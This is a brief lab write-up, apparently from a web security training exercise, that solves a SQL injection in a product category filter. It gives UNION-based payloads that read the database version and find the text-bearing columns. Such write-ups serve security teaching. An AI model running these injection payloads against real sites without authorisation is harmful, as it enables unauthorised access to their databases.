
## Description:

this lab contains a SQL injection vulnerability in the product category filter, a UNION attack might be used to retrieve the results from an injected query

## Solution:

	' UNION SELECT NULL, @@version%23
[%23 represents an url encoded '#' character]

## Notes:

when executing a UNION attack it is important to determine the number of columns that are being returned and which of those columns contain text data, in this case the payload below can be used for the verification

	' UNION SELECT 'abc','def'#

